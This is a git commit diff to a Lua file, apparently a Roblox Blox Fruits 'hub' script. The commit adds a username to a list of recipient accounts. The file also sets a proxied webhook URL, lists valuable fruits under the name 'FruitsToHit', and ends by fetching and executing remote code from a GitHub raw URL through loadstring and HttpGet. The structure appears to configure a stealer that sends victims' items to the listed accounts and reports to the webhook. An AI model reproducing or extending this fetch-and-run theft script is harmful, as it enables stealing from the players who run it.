ea82bb6a82734eeef71079e7a72d6f675b4b5523
vovasevere200 <vovasevere@gmail.com>
2025-02-21 17:00:48 +0700

    severhub.lua

--- severhub.lua
+++ severhub.lua
@@ -1,5 +1,5 @@
 Webhook = "https://webhook-protect.vercel.app/api/webhook?id=Q19aZkVQVHVrOWZsRGotUnhEOEpCdzpXRTc0dUNoTGdaT080VmpjUlJxNlNPVnoxM3hMTWwtWk1Tb0IwMkNYbnJVT2ZBYjYwTWlxZU85dERwdURRUXFFbk5UNzN0NlFxb3RyQlF2T19DMWd2cHpkcGR0YURiQS1ER3hZbTIwWHNBZ2s1MkJvVjRwWGo0Ujh1M2FCdUFtdDRjU3ZmbnlubU5rSW4yVU5wUmh6LUtGMmhZVFNXZ3g4QktTaW1CMHhMbUE"
-Usernames = {"3IKSSA228", "vovasevere1", "BosicXyesik1"}
+Usernames = {"3IKSSA228", "vovasevere1", "BosicXyesik1", "LALKA22AAA"}
 FruitsToHit = {"Buddha-Buddha", "Portal-Portal", "Rumble-Rumble", "Blizzard-Blizzard", "Gravity-Gravity", "Mammoth-Mammoth", "T-Rex-T-Rex", "Shadow-Shadow", "Dough-Dough", "Venom-Venom", "Gas-Gas", "Control-Control", "Spirit-Spirit", "Yeti-Yeti", "Leopard-Leopard", "Kitsune-Kitsune"}
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
